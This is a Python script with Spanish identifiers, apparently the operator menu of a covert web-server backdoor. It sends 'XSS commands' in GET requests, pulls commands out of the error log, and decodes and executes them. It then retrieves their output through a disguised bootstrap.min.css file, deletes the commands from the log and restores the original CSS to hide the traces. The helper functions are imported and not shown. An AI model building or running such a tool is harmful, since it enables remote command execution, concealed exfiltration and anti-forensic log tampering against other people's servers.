# -*- coding: utf-8 -*-
"""
Created on Sun Apr 14 12:58:37 2024

@author: Fan_tasma
"""

from funciones import obtener_solicitud_get, leer_registro_errores, recuperar_comandos, \
    decodificar_y_ejecutar_comando, guardar_salida_comando, recuperar_resultados_get, \
    eliminar_comando_registro, restaurar_archivo_css_original
import time

def mostrar_menu():
    print("=== Menú ===")
    print("1. Obtener solicitud GET /specific_pattern (con comando XSS)")
    print("2. Leer registro de errores")
    print("3. Recuperar comandos")
    print("4. Decodificar y ejecutar comandos")
    print("5. Recuperar resultados mediante GET /bootstrap.min.css")
    print("6. Eliminar comandos del archivo de registro")
    print("7. Esperar 15 segundos")
    print("8. Restaurar archivo CSS original")
    print("9. Salir")

def ejecutar_opcion(opcion):
    if opcion == "1":
        comando_xss = input("Ingrese el comando XSS que desea ejecutar: ")
        url_specific_pattern = input("Ingrese la URL de la solicitud GET /specific_pattern: ")
        obtener_solicitud_get(url_specific_pattern, comando_xss)
    elif opcion == "2":
        leer_registro_errores()
    elif opcion == "3":
        patron = input("Ingrese el patrón para recuperar los comandos: ")
        registro_errores = leer_registro_errores()
        comandos = recuperar_comandos(patron, registro_errores)
        print("Comandos recuperados:", comandos)
    elif opcion == "4":
        comando = input("Ingrese el comando a decodificar y ejecutar: ")
        output = decodificar_y_ejecutar_comando(comando)
        if output:
            guardar_salida_comando(output)
    elif opcion == "5":
        url_css = input("Ingrese la URL del archivo bootstrap.min.css: ")
        resultados_css = recuperar_resultados_get(url_css)
        print("Resultados obtenidos:", resultados_css)
    elif opcion == "6":
        comando = input("Ingrese el comando a eliminar del archivo de registro: ")
        eliminar_comando_registro(comando)
    elif opcion == "7":
        segundos = int(input("Ingrese la cantidad de segundos a esperar (por ejemplo, 15): "))
        print("Esperando {} segundos...".format(segundos))
        time.sleep(segundos)
        print("Espera finalizada.")
    elif opcion == "8":
        restaurar_archivo_css_original()
        print("Archivo CSS original restaurado.")
    elif opcion == "9":
        print("Saliendo del programa...")
        exit()
    else:
        print("Opción no válida. Por favor, seleccione una opción válida.")

def main():
    while True:
        mostrar_menu()
        opcion = input("Seleccione una opción: ")
        ejecutar_opcion(opcion)

if __name__ == "__main__":
    main()
